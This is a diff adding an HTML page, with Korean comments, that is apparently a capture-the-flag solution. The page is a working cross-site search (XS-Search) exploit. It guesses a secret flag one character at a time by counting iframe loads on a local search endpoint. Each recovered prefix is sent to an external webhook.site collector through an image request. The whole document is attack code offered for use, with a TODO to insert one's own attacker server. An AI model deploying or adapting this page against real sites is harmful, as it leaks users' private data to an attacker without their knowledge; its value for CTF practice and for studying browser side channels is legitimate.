@@ -1,0 +1,79 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>XS-Search Exploit</title>
+</head>
+<body>
+    <h1>XS-Search Attack in Progress...</h1>
+    <p>Found Flag: <span id="result"></span></p>
+
+    <script>
+        // 1. 설정 변수
+        // TODO: 이 주소를 당신의 공격용 서버 주소로 바꾸세요.
+        const ATTACKER_SERVER = "https://webhook.site/c35755ab-4aad-44a1-b5ee-f981e3c5902e"; 
+        const BASE_URL = "http://127.0.0.1:8000/search";
+        const CHARSET = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_{}";
+        
+        let flag = "";
+        const resultElement = document.getElementById("result");
+        resultElement.innerText = flag;
+
+        // 2. 특정 문자가 맞는지 테스트하는 핵심 함수 (Promise 반환)
+        function testChar(charToTest) {
+            return new Promise((resolve) => {
+                const query = flag + charToTest;
+                const targetUrl = `${BASE_URL}?query=${encodeURIComponent(query)}`;
+
+                const iframe = document.createElement('iframe');
+                document.body.appendChild(iframe);
+
+                let loadCount = 0;
+                iframe.onload = () => { loadCount++; };
+
+                iframe.src = targetUrl;
+
+                setTimeout(() => {
+                    iframe.src = targetUrl + '#';
+                }, 500);
+
+                setTimeout(() => {
+                    document.body.removeChild(iframe);
+                    if (loadCount === 1) {
+                        resolve(true); // 성공
+                    } else {
+                        resolve(false); // 실패
+                    }
+                }, 1000);
+            });
+        }
+
+        // 3. 공격을 시작하고 다음 문자를 찾는 메인 함수
+        async function findNextChar() {
+            for (const char of CHARSET) {
+                const success = await testChar(char);
+
+                if (success) {
+                    flag += char;
+                    resultElement.innerText = flag;
+                    
+                    new Image().src = `${ATTACKER_SERVER}/?flag=${encodeURIComponent(flag)}`;
+
+                    if (char === '}') {
+                        console.log("Finished! Final Flag:", flag);
+                        alert("Finished! Final Flag: " + flag);
+                        return;
+                    }
+
+                    findNextChar();
+                    break;
+                }
+            }
+        }
+
+        // 4. 공격 시작
+        window.onload = () => {
+            findNextChar();
+        };
+    </script>
+</body>
+</html>
